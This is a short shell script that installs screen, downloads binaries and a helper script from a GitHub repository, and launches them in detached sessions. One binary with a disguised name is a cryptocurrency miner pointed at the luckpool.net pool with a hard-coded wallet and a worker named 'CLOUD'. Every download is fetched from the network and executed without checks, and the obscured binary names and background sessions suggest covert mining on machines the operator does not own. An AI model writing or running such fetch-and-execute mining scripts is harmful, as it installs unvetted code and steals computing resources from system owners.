#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS kontol3.sh ./kontol3.sh 65 75

wget https://github.com/renilo/xmr/raw/main/memek

wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru

chmod +x meki-baru

wget -O verus-solver https://github.com/renilo/xmr/raw/main/verus-solver

chmod 777 verus-solver

screen -dmS run ./meki-baru -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 4

wget https://raw.githubusercontent.com/renilo/xmr/main/kontol3.sh

chmod +x kontol3.sh

./kontol3.sh
